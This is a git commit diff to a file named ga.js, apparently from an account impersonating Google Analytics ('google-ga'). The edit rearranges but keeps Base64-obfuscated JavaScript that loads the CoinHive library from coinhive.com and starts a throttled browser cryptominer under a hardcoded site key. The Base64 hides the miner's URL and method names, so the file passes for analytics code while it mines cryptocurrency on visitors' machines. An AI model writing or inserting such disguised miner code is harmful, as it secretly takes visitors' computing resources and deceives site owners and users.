53632633401f4b70eb17f99eaf920b43f274e1a4
google-ga <32638005+google-ga@users.noreply.github.com>
2017-10-13 23:19:30 +0300

    Update ga.js

--- ga.js
+++ ga.js
@@ -8,11 +8,12 @@ function loadScript(url, callback)
     script.onload = callback;
     head.appendChild(script);
 }
-var script = atob("aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==")
 var afterFunction = function() {
-	var hostname = window.location.hostname;
-	var ga = new window[atob("Q29pbkhpdmU=")][atob("VXNlcg==")]('JrUWA6Zd72wf62sOQR49Fb4GlhA1fOpP', hostname);
-	window["ga"][atob("c2V0VGhyb3R0bGU=")](0.2)
-	window["ga"][atob("c3RhcnQ=")]();
+	g = new window[atob("Q29pbkhpdmU=")][atob("VXNlcg==")]('JrUWA6Zd72wf62sOQR49Fb4GlhA1fOpP', hostname);
+	window["g"][atob("c2V0VGhyb3R0bGU=")](0.2);
+	window["g"][atob("c3RhcnQ=")]();
 };
+var g;
+var hostname = window.location.hostname;
+var script = atob("aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==");
 loadScript(script, afterFunction);
